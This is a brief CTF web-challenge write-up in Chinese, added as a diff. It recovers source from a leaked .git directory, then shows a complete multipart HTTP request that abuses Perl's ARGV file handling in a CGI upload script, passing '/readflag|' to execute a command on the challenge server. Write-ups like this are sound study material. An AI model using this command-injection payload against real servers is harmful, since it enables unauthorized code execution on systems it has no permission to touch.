@@ -1,0 +1,38 @@
+網站上有.git洩漏
+tools: https://github.com/denny0223/scrabble
+./scrabble http://104.199.235.135:31334/ --> 拿到原碼
+
+發現有file名稱的洩漏
+參考資料: 
+https://github.com/73696e65/ctf-notes/blob/master/2016-ctf.csaw.io/web-200-i_got_id.md
+https://events.ccc.de/congress/2014/Fahrplan/system/attachments/2542/original/the-perl-jam-netanel-rubin-31c3.pdf
+
+Burp Suite:
+POST /cgi-bin/index.cgi?/readflag| HTTP/1.1
+Host: 104.199.235.135:31334
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Type: multipart/form-data; boundary=---------------------------1308552532609826431173673727
+Content-Length: 476
+
+-----------------------------1308552532609826431173673727
+Content-Disposition: form-data; name="file"
+Content-Type: text/plain
+
+ARGV
+-----------------------------1308552532609826431173673727
+Content-Disposition: form-data; name="file"; filename="test.txt"
+Content-Type: text/plain
+
+abcd
+-----------------------------1308552532609826431173673727
+Content-Disposition: form-data; name="Submit!"
+
+Submit!
+-----------------------------1308552532609826431173673727--
+
